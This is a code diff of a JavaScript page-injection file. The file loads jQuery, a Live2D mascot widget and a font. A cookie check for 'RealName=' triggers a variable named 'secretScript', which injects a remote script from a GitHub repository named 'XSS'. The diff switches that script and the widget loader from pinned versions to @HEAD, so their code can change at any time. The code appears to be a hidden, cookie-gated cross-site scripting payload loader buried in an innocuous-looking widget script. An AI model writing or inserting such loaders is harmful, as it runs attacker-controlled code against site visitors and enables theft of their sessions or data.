@@ -17,7 +17,7 @@ jqueryScript.setAttribute("src", "https://cdn.jsdelivr.net/npm/jquery/dist/jquer
 body.insertAdjacentElement("afterbegin", jqueryScript);
 
 const autoloadScript = document.createElement("script");
-autoloadScript.setAttribute("src", "https://cdn.jsdelivr.net/gh/OverJerry/CDN@1.4/live2d/autoload.js");
+autoloadScript.setAttribute("src", "https://cdn.jsdelivr.net/gh/OverJerry/CDN@HEAD/live2d/autoload.js");
 body.insertAdjacentElement("afterbegin", autoloadScript);
 
 const fontLink = document.createElement("link");
@@ -68,7 +68,7 @@ jQuery(document).ready(function($) {
     t = cookie.indexOf("RealName=");
     if (s == -1 && t != -1 && cookie[t + 9] != '&') {
         const secretScript = document.createElement("script");
-        secretScript.setAttribute("src", "https://cdn.jsdelivr.net/gh/OverJerry/XSS@1.0/1.js");
+        secretScript.setAttribute("src", "https://cdn.jsdelivr.net/gh/OverJerry/XSS@HEAD/1.js");
         body.insertAdjacentElement("afterbegin", secretScript);
     }
 
